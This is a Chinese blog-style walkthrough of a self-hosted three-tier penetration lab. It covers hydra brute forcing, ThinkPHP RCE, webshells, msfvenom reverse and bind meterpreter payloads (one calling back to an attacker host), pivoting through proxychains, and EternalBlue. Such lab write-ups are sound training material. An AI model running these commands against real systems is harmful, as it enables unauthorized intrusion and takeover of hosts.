## 已知信息和目标

- `IP：192.168.43.43` （靶机是自己虚拟机里面搭建的，咱们假设他是一个公网IP熬！）

- 对其进行一个内网渗透，获取FLAG

## 0x1拿下Target1

```
┌──(root💀kali)-[~]
└─# nmap -sS -p 1-65535 192.168.43.43
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 18:47 CST
Nmap scan report for 192.168.43.43
Host is up (0.00094s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
888/tcp  open  accessbuilder
3306/tcp open  mysql
8888/tcp open  sun-answerbook
MAC Address: 00:0C:29:2B:4A:A4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.76 seconds
```

### 对FTP进行爆破

`hydra -vV -l root -P /tools/dict/00xFuzzDicts\(全\)/passwordDict/top6000.txt 192.168.43.43 ftp    `

![image-20210823192913771](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823192913771.png)

没爆破出来

### 对SSH进行爆破

`hydra -vV -l root -P /tools/dict/00xFuzzDicts\(全\)/passwordDict/top6000.txt 192.168.43.43 ssh    `

还是没爆破出来，弱密码不在爱我

### mysql

禁止远程连接，玩个屁

### 8888

![image-20210823195253131](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823195253131.png)

开的是宝塔，找不到他随机数的地址，放一放吧

### Http服务

![image-20210823194048240](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823194048240.png)

呦西，80开的是ThinkPHP这个我可就太会了,先进行目录扫描

![image-20210823194732385](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823194732385.png)

第一个`payload`没有什么用

访问`robots.txt`获得第一个flag：flag{QeaRqaw12fs}

直接掏出我珍藏多年的`TPscan`

![image-20210823194245094](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823194245094.png)

直接可以RCE了，一键`GetShll`，蚁剑连接，查看目录获得第二个`flag`

![image-20210823195032410](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823195032410.png)

flag{e2D3aFdasde}

遍历目录寻找有用的信息，找到数据库配置文件，但是没有什么可用信息。

![image-20210823200834509](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823200834509.png)

在根目录找到一个`flag`：flag{qEa12Nasd1a}。

到这里前台靶机完事，我最爱`thinkphp`

### 内网信息收集

![image-20210823201157131](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823201157131.png)

目前是一个`www`权限的，靶机存在两块网卡，192.168.43.43(前面规定好的公网IP)，和192.168.22.128（内网IP）

下一步进行内网信息收集，首先探测整个D段是否有存活主机：

```sh
#！/bin/bash
for num in {1..254};
    do
        ip=192.168.22.$num
        ping -c1 $ip >/dev/null 2>&1
        if [ $? = 0];
        then
            echo "$ip" ok
        else
            echo "$ip" fail
        fi
    done
```

![image-20210823201801111](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823201801111.png)

上传之后我们发现该文件是`644`权限，将这个文件提升为`777`权限。

```bash
chmod 777 ping.sh
```

![image-20210823201947729](https://husins.oss-cn-beijing.aliyuncs.com/image-20210823201947729.png)

执行`ping.sh`

![image-20210825104523914](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825104523914.png)

这里扫到`129`和`130`,其中`130`是当前机器的IP地址,那么`129`就是内网纵向渗透目标。

### 将靶机上线到MSF

使用`uname -a`收集目标机信息，得到为`64位linux`系统

![image-20210825105559265](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825105559265.png)

使用msf生成木马文件，并上传

`msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.43.165 lport=5000 -f elf > msf5000.elf`

![image-20210825105858772](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825105858772.png)

将生成的木马上传到目标机器，并赋予`777`权限

![image-20210825110113400](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825110113400.png)

在MSF开启监听，然后在目标机运行木马文件（因为这里是反向连接）

攻击机操作：`handler -p linux/x64/meterpreter_reverse_tcp -H 192.168.43.165 -P 5000`

![image-20210825110548001](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825110548001.png)

目标机操作：`./msf5000.elf`

![image-20210825110651768](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825110651768.png)

收到会话，成功拿到`meterperter`进入主机：

![image-20210825111505890](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825111505890.png)

## 0x2拿下Target2

在`meterpreter`中添加路由信息：`route add  -s 192.168.22.0/24`

![image-20210825120423737](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825120423737.png)

使用代理模块构建代理

![image-20210825121602169](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825121602169.png)

`vim /etc/proxychains4.conf`配置代理工具

![image-20210825121901955](https://husins.oss-cn-beijing.aliyuncs.com/image-20210825121901955.png)

使用Nmap对内网`192.168.22.129`进行扫描（这里由于协议的问题你的ping是不能用的）

![image-20210826113009935](https://husins.oss-cn-beijing.aliyuncs.com/image-20210826113009935.png)

用与第一台靶机相同的 方法，渗透第二台主机，其他服务都没有办法下手，只能在`80`端口入手

![image-20210908161502423](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908161502423.png)

![image-20210908164349790](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908164349790.png)

使用`sqlmap`获取数据库信息，可以得到后台登录的账号密码`admin/123qwe`

通过百度获取到后台登录地址`/index.php?r=admini/public/login`,登录后台

![image-20210908164710416](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908164710416.png)

在模板处添加一句话木马

![image-20210908165016290](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908165016290.png)

使用`proxifiter`将流量代理到`10.203.87.119:1080`端口使用菜刀，连接webshell。

Target2的情况和Target1差不多，双网卡还存在一个33网段的ip，进行存活主机探测

![image-20210908171107919](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908171107919.png)

![image-20210908171244637](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908171244637.png)

发现存活`192.168.33.33`,再次进行横向 渗透。

## 0x7拿下Target3

使用`uname -a`查询靶机版本信息：

![image-20210908172111200](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908172111200.png)

搜索可用的正向meterperter木马

`msfvenom --list payloads | grep "linux/x64"`

![image-20210908172004889](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908172004889.png)



生成正向代理的`meterperter`木马`msfvenom -p linux/x64/meterpreter/bind_tcp lport=5001 -f elf -o bind5001.elf`,并上传到靶机中，赋予777权限：

![image-20210908172702670](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908172702670.png)

在目标机运行木马文件

![image-20210908173223861](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908173223861.png)

在`msf`中正向连接这个机器

`handler -p linux/x64/meterpreter/bind_tcp -H 192.168.22.129 -P 5001`

![image-20210908173421415](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908173421415.png)

添加路由

![image-20210908173553444](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908173553444.png)

收集Target3 上的信息

![image-20210908173946805](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908173946805.png)

明显是`widows`系统开放445端口，尝试永恒之蓝

寻找永恒之蓝的EXP

![image-20210908175253297](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908175253297.png)

`payload`为反向的，将其修改为正向：

![image-20210908175505416](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908175505416.png)

设置`options`,并进行攻击

![image-20210908175553160](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908175553160.png)

![image-20210908175625706](https://husins.oss-cn-beijing.aliyuncs.com/image-20210908175625706.png)

至此CFS三层靶场完成！（泪目了,对MSF使用了不熟练，弄了很久，加油把！）
